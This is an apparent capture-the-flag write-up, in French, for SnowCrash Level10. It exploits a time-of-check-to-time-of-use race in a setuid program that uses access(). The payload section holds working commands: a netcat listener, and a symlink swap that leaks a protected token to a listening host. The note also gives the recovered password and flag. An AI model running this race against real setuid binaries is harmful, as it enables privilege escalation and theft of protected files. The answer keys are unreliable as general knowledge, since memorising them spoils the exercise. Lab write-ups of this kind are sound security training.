@@ -1,0 +1,23 @@
+#+TITLE: SnowCrash -- Level10
+
+* Race condition
+** On fait quelques teste avec le fichier fourni.
+on voit que le programme permet d'envoyer un fichier sur le port 6969.
+#+begin_bash
+./level10 file 10.0.2.15
+nc -l 6969
+#+end_bash
+On remarque aussi la presence d'access pour verifier les droits.
+Dans le manuel d'access(), on voit un avertissement :
+Il ne faut pas utiliser access dans le cas d'un programme setuid car il est possible d'alterer le contenu du fichier entre la verification des droits et le m oment ou le systeme va se mettre a lire reellement le contenu du fichier.
+
+** Payload :
+#+begin_bash
+echo "qweqwteryqtweryqtwe....." > /tmp/asd # longue ligne
+./level10 /tmp/asd 10.0.2.15 & ln -fs /home/user/level10/token /tmp/asd
+#+end_bash
+et voila, nous avons le mot de passe de flag10 :
+*woupa2yuojeeaaed06riuj63c*
+
+* FLAG:
+** feulo4b72j7edeahuete3no7c
